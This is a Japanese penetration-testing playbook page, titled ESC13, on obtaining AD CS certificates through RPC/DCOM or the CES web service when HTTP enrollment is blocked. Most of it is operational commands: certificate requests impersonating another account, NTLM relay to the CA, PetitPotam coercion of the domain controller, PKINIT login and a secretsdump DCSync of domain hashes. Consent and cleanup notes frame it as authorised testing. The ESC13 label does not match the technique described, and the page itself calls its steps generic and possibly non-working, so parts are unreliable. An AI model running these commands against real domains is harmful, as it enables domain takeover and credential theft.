# ESC13 — DCOM / RPC / CES 経由の証明書発行（HTTP 以外の WebEnrollment 代替）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下のいずれかの状況で実施する：

- **ESC8（HTTP WebEnrollment）のリレーは試みたが `/certsrv/` エンドポイントが存在しない・HTTPS 強制・NTLM 認証が無効化されている**
- CA サーバーへの RPC/DCOM（`135/tcp` およびダイナミックポート）または CES（Certificate Enrollment Web Service。通常 `443/tcp`、パス `/[CA_NAME]_CES_UsernamePassword/` 等）でのアクセスが可能である
- NTLM リレー（`ntlmrelayx`）のターゲットとして RPC/DCOM または CES エンドポイントを指定できる状況にある
- または直接の認証情報（ユーザー名・パスワード・ハッシュ）を使って証明書を申請できる

**攻撃者の思考トレース：** ESC8 は HTTP の `/certsrv/` WebEnrollment インターフェースへの NTLM リレーを悪用するが、この HTTP エンドポイントは無効化・HTTPS 化されているケースがある。しかし AD CS はエンドポイントとして HTTP 以外にも RPC/DCOM（ICertPassage インターフェース）と CES（HTTPS ベースの証明書登録 Webサービス）を持つ。Certipy の `req` コマンドはデフォルトで RPC を使用するため、通常の証明書申請も実は RPC 経由で動作している。RPC エンドポイントへの NTLM リレーや CES への直接申請が別経路として機能する。

> **注意（ESC13 は環境依存が特に強く PoC が限られる）：** CES や DCOM リレーの実装は Certipy および Impacket のバージョン・ターゲット OS の組み合わせで動作が大きく変わる。本ファイルに記載する手順は一般論にとどまり、実環境では追加のデバッグが必要になることが多い。

---

## 環境前提

- **実行環境**: テスター端末（ドメインネットワーク上・CA サーバーへの RPC または CES ポートへの到達性があること）
- **必要なツール**:
  - Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
  - Responder + ntlmrelayx（NTLM リレーを使う場合）
  - または有効なドメインユーザー認証情報（直接申請の場合）
- **必要な権限**: テンプレートへの Enrollment 権限を持つドメインユーザー（リレーの場合は DC$ など高権限アカウントの認証を捕捉できること）
- **ポート要件**:
  - RPC/DCOM リレー: `135/tcp`（エンドポイントマッパー）+ ダイナミック高ポート
  - CES: `443/tcp`（通常 HTTPS。パスは環境により異なる）
- **オフライン代替**: Windows 端末上では `certreq -submit` が RPC 経由での申請を行う。CES は `certreq -config` でエンドポイント指定が可能

---

## 観点・着眼点

### 先に確認すること

```bash
# [Attacker] CA の利用可能なエンドポイントを Certipy で確認
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -stdout
```

CA エントリの出力例：

```
Certificate Authorities
  0
    CA Name                             : [CA_NAME]
    DNS Name                            : [CA_SERVER_FQDN]
    Certificate Subject                 : CN=[CA_NAME], ...
    Web Enrollment                      : Disabled       ← HTTP WebEnrollment が無効（ESC8 は使えない）
    ...
    # CES や DCOM は Certipy の find では直接表示されない場合がある
```

CES エンドポイントの存在確認：

```bash
# [Attacker] CES エンドポイントの存在を確認（よくあるパス）
curl -k -I "https://[CA_SERVER_FQDN]/[CA_NAME]_CES_UsernamePassword/"
curl -k -I "https://[CA_SERVER_FQDN]/[CA_NAME]_CES_Kerberos/"
# HTTP 200 / 401 が返れば CES が存在する
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `Web Enrollment: Disabled` かつ CA サーバーが `135/tcp` で到達可能 | RPC 経由の直接申請（Certipy はデフォルトで RPC を使用）を試みる |
| CES エンドポイントが HTTP 200/401 で応答 | CES 経由の申請を試みる（`certipy req` に `-web` オプション等） |
| NTLM リレー環境（Responder 起動中）で DC$ 認証を捕捉できた | ntlmrelayx の `-t` に CA の RPC または CES を指定してリレーを試みる |
| RPC/DCOM ポートがファイアウォールで遮断されている | 別の ESC 経路を確認する。ESC8 が使えない・RPC も使えないなら ESC1〜7 を再確認 |

---

## 手順

### パターン A：RPC 経由の直接証明書申請（Certipy デフォルト）

事前準備（必須）：時刻同期

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

```bash
# [Attacker] Certipy は -web を指定しない限りデフォルトで RPC/DCOM 経由で申請する
certipy req \
  -ca [CA_NAME] \
  -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -upn [TARGET_UPN]
# RPC エンドポイントには CA_SERVER_FQDN への到達性が必要
# DC の IP（-dc-ip）は Kerberos/LDAP 用。CA が別サーバーの場合は -target でCA_IPを指定
```

CA が DC と別サーバーの場合：

```bash
# [Attacker] -target で CA サーバーを直接指定
certipy req \
  -ca [CA_NAME] \
  -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -target [CA_SERVER_IP] \
  -upn [TARGET_UPN]
```

### パターン B：CES 経由の証明書申請

```bash
# [Attacker] CES（UsernamePassword 認証）経由で申請
certipy req \
  -ca [CA_NAME] \
  -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -web \
  -upn [TARGET_UPN]
# -web フラグで HTTP/HTTPS ベースの CES エンドポイントを使用
```

### パターン C：RPC/DCOM エンドポイントへの NTLM リレー

```bash
# [Attacker] ntlmrelayx で CA の RPC エンドポイントにリレー（ESC8 の HTTP 代替）
# 別ターミナルで Responder を起動しておく
sudo python3 ntlmrelayx.py \
  -t "rpc://[CA_SERVER_IP]" \
  --adcs \
  --template [VULNERABLE_TEMPLATE] \
  -smb2support
# DC の認証を Coerce（PetitPotam 等）でリレー起点を作成する
```

DC$ の認証強制（別ターミナル）：

```bash
# [Attacker] PetitPotam で DC$ の認証を強制
python3 PetitPotam.py \
  -u [USER] \
  -p "[PASSWORD]" \
  [ATTACKER_IP] [DC_IP]
```

### 証明書取得後：PKINIT 認証 → NT ハッシュ → DCSync

```bash
# [Attacker] Step 1: PKINIT 認証
certipy auth \
  -pfx [TARGET_USERNAME].pfx \
  -dc-ip [DC_IP]

# [Attacker] Step 2: NT ハッシュで DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/[TARGET_USERNAME]@[DC_IP]
```

### 原状回復：証明書の失効

```bash
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy req` が `[Errno Connection refused]` / `rpc_s_access_denied` | CA サーバーの RPC ポート（135）へのファイアウォール。`-target` オプションで CA の IP を直接指定して確認 |
| CES エンドポイントに `curl` が `401 Unauthorized` のみ返す | CES が Kerberos 認証を要求している可能性。`-web` + Kerberos チケット利用（`-k`）を試みる |
| RPC リレーが ntlmrelayx で動作しない | ntlmrelayx の `--adcs` オプションは HTTP エンドポイント向けで、RPC リレーは別の実装が必要な場合がある。Certipy の `relay` サブコマンドを確認する |
| ESC8 は使えず ESC13 も使えない | HTTP・RPC・CES すべてが利用不可か強制認証。ESC1〜7 でテンプレート・ACL 経由の経路を再確認する |

---

## 注意点・落とし穴

- **`-target` と `-dc-ip` の使い分け**：`-dc-ip` は Kerberos・LDAP 問い合わせ先（DC の IP）。RPC 申請の宛先は CA サーバー（DC と別の場合がある）を `-target` で指定する。混同すると `certipy req` が失敗する
- **RPC ダイナミックポートのファイアウォール**：RPC は `135/tcp`（エンドポイントマッパー）に加えてダイナミックポート（`49152〜65535/tcp`）を使う。ファイアウォールがダイナミックポートを遮断している場合は RPC 経由の申請が通らない
- **CES のパス形式は環境依存**：`/[CA_NAME]_CES_UsernamePassword/`・`/[CA_NAME]_CES_Kerberos/` はよくあるパス形式だが、管理者がカスタマイズしている場合は異なる
- **Certipy のバージョン確認**：`relay` サブコマンドの対応状況は Certipy のバージョンに依存する。`certipy --version` で確認し、必要に応じてアップデートする

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。NTLM リレーを伴う場合は特に影響範囲の確認が必要
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ RPC 接続ログ / MDI アラート
- **業務影響リスク**: NTLM リレーの場合はネットワーク干渉の可能性。直接申請は証明書発行のみで業務影響は低い
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC8（HTTP WebEnrollment への NTLM リレー。HTTP が使える場合の同等手法） → `./ESC8.md`
- 前：Coerce 系（NTLM リレーの起点）→ `../NTLM_Relay/Coerce.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
